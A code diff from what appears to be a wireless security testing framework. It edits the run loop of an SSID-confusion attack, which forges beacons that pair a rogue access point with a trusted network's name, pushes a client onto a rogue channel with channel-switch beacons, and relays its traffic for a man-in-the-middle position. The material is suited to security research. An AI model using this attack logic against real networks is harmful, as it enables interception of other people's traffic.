@@ -19,13 +19,12 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::mac));
     const HWAddress<6> client_perm(sta.get(SK::permanent_mac));
 
-    // Scan for WrongNet beacon on ch 11.
-    // beacon stays as WrongNet - send_csa_beacon() uses it as CSA template on real channel.
 	const auto &att_cfg = rs.config().at("attack_config");
+	// scan for real AP beacon on real channel
 	setup_real_AP_RSN_frames(att_cfg.at("beacon_timeout_sec"));
 
-    // Build confused beacon separately: rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel.
-    // Using rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect.
+    // rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel
+    // rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect
     auto confused_beacon = make_confused_beacon(*beacon, confused_ssid, false);
     confused_beacon->addr2(rogue_ap_mac);
     confused_beacon->addr3(rogue_ap_mac);
@@ -51,24 +50,11 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 	sock_rogue->set_filter(bpf);
 
 	const string nic_client_ack = "client_ack_vif";
-	const auto &netns = rogue_sta[SK::netns];
-
 	rogue_sta->set_mac_address(sta->get(SK::mac));
 	start_ap_hostapd(rs, nic_client_ack, rogue_sta, netconfig.real_channel, client_perm);
 
     rs.start_observers(ObserverRunPolicy::SKIP);
     rs.process_manager.write_log_all(ATTACK_START_tag);
-
-    // Initial CSA burst: spoof WrongNet MAC, push client ch 11 -> ch 1
-    /*for(int pass = 0; pass < 3; ++pass) {
-        for(int cnt = CSA_attack::CHANNEL_SWITCH_MAX; cnt >= 0; --cnt) {
-            RadioTap csa = CSA_attack::get_CSA_beacon(
-                ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, cnt, beacon.get());
-            send_to_real(csa);
-            interruptible_sleep(milliseconds(beacon_ms));
-        }
-    }*/
-
 
     const auto start      = steady_clock::now();
     auto next_beacon      = steady_clock::now();
@@ -80,7 +66,6 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
             log(LogLevel::INFO, "Attack timeout");
             break;
         }
-        //if(only_to_mitm && got_mitm) break;
 
     	const int fd_real = pcap_get_selectable_fd(sock_real->get_pcap_handle());
     	const int fd_rogue = pcap_get_selectable_fd(sock_rogue->get_pcap_handle());
@@ -93,11 +78,11 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
         timeval tv{ 0, (max<long>(0, min<long>(us_to_beacon, 100'000))) };
         select(max(fd_real, fd_rogue) + 1, &read_fds, nullptr, nullptr, &tv);
 
-    	// ch 11: frames from WrongNet AP -> relay to client on ch 1 (translate BSSID)
+    	// real_channel: frames from WrongNet AP -> relay to client on ch rogue_channel (translate BSSID)
     	if(FD_ISSET(fd_real, &read_fds)) {
     		while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
     	}
-    	// ch 1: frames from confused client -> relay to WrongNet on ch 11 (translate BSSID back)
+    	// ch rogue_channel: frames from confused client -> relay to real AP on real_channel (translate BSSID back)
     	if(FD_ISSET(fd_rogue, &read_fds)) {
     		while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
     	}
@@ -116,7 +101,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
         }
     }
     rs.process_manager.write_log_all(ATTACK_STOP_tag);
-	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" }, netns, true);
+	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" },  rogue_sta[SK::netns], true);
 
 }
 
